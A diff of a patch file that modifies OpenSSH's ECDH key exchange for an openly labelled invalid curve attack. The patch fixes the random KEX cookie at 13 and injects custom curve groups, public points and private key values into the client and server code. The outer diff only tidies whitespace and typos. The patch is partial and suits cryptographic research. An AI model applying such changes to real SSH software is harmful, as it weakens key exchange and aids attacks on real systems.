@@ -4,7 +4,7 @@ index 8cdefcf7..a506a9df
 @@ -62,6 +62,9 @@
  #include "sshbuf.h"
  #include "digest.h"
- 
+
 +//Invalid Curve Patch
 +#define DEBUG_KEXECDH
 +
@@ -14,7 +14,7 @@ index 8cdefcf7..a506a9df
 @@ -574,6 +577,13 @@ kex_send_kexinit(struct ssh *ssh)
  	}
  	arc4random_buf(cookie, KEX_COOKIE_LEN);
- 	
+
 +	//Invalid Curve Attack Patch
 +	//Sets the random cookie to always be 13
 +	int i;
@@ -31,7 +31,7 @@ index efb2e55a..639c3fbd
 @@ -42,52 +42,158 @@
  #include "digest.h"
  #include "ssherr.h"
- 
+
 +//Invalid Curve Attack Patch
 +//Some helper classes from openssl and logging support
 +#include <openssl/ec.h>
@@ -43,7 +43,7 @@ index efb2e55a..639c3fbd
  static int
  kex_ecdh_dec_key_group(struct kex *, const struct sshbuf *, EC_KEY *key,
      const EC_GROUP *, struct sshbuf **);
- 
+
 +//This is used when acting as the client
  int
  kex_ecdh_keypair(struct kex *kex)
@@ -54,9 +54,9 @@ index efb2e55a..639c3fbd
  	const EC_POINT *public_key;
  	struct sshbuf *buf = NULL;
  	int r;
- 
+
 +	//Invalid Curve Attack Patch
-+	//Inizialize custom keys and EC objects
++	//Initialize custom keys and EC objects
 +	int i;
 +	EC_KEY *custom_ec_key = NULL;
 +	EC_GROUP *custom_group = NULL;
@@ -106,7 +106,7 @@ index efb2e55a..639c3fbd
 +		fprintf(stderr, "Created new pub point\n");
 +	}
 +
-+	//Set the public key point coordiantes
++	//Set the public key point coordinates
 +	i = EC_POINT_set_affine_coordinates(custom_group, custom_pub_point, x_pub, y_pub, NULL);
 +
 +
@@ -131,7 +131,7 @@ index efb2e55a..639c3fbd
  	}
 +
 +	//Set our custom keys
-+	
++
 +	i = EC_KEY_set_group(client_key, custom_group);
 +	fprintf(stderr, "Set group: %d\n", i);
 +	i = EC_KEY_set_private_key(client_key, priv_key_exp);
@@ -142,7 +142,7 @@ index efb2e55a..639c3fbd
 +
  	group = EC_KEY_get0_group(client_key);
  	public_key = EC_KEY_get0_public_key(client_key);
- 
+
 +	custom_group = EC_KEY_get0_group(custom_ec_key);
 +	custom_pub_point = EC_KEY_get0_public_key(custom_ec_key);
 +
@@ -169,12 +169,12 @@ index efb2e55a..639c3fbd
  #endif
 +
 +
-+	
++
 +
  	kex->ec_client_key = client_key;
  	kex->ec_group = group;
 -	client_key = NULL;	/* owned by the kex */
-+	client_key = NULL;	//owned by the kex 
++	client_key = NULL;	//owned by the kex
  	kex->client_pub = buf;
  	buf = NULL;
 +
@@ -183,7 +183,7 @@ index efb2e55a..639c3fbd
  	sshbuf_free(buf);
  	return r;
  }
- 
+
 +//Invalid Curve Patch
 +//This is used when acting as the server
  int
@@ -192,7 +192,7 @@ index efb2e55a..639c3fbd
 @@ -101,6 +207,33 @@ kex_ecdh_enc(struct kex *kex, const struct sshbuf *client_blob,
  	*server_blobp = NULL;
  	*shared_secretp = NULL;
- 
+
 +	//Initialize custom variables and keys
 +	int i;
 +	EC_KEY *custom_ec_key = NULL;
@@ -232,7 +232,7 @@ index efb2e55a..639c3fbd
 +	i = EC_KEY_set_group(server_key, custom_group);
 +
  	group = EC_KEY_get0_group(server_key);
- 
+
 +	i = EC_POINT_set_affine_coordinates(group, custom_pub_point, x_pub, y_pub, NULL);
 +	i = EC_KEY_set_private_key(server_key, priv_key_exp);
 +	i = EC_KEY_set_public_key(server_key, custom_pub_point);
@@ -256,15 +256,15 @@ index efb2e55a..639c3fbd
 @@ -134,6 +283,7 @@ kex_ecdh_enc(struct kex *kex, const struct sshbuf *client_blob,
  	return r;
  }
- 
+
 +//Invalid Curve Patch
  static int
  kex_ecdh_dec_key_group(struct kex *kex, const struct sshbuf *ec_blob,
      EC_KEY *key, const EC_GROUP *group, struct sshbuf **shared_secretp)
 @@ -147,6 +297,7 @@ kex_ecdh_dec_key_group(struct kex *kex, const struct sshbuf *ec_blob,
- 
+
  	*shared_secretp = NULL;
- 
+
 +
  	if ((buf = sshbuf_new()) == NULL) {
  		r = SSH_ERR_ALLOC_FAIL;
@@ -316,7 +316,7 @@ index efb2e55a..639c3fbd
 +
  	return r;
  }
- 
+
 index 4bcb89ba..78cef980
 --- a/ssh-ecdsa.c
 +++ b/ssh-ecdsa.c
@@ -329,7 +329,7 @@ index 4bcb89ba..78cef980
 +//Invalid Curve Patch
 +//Include logging support
 +#include "log.h"
- 
+
 +#define DEBUG_PK
  static u_int
  ssh_ecdsa_size(const struct sshkey *key)
@@ -374,4 +374,3 @@ index 56ffdd86..5cc06cf6
 +		;
  	return 0;
  }
- 
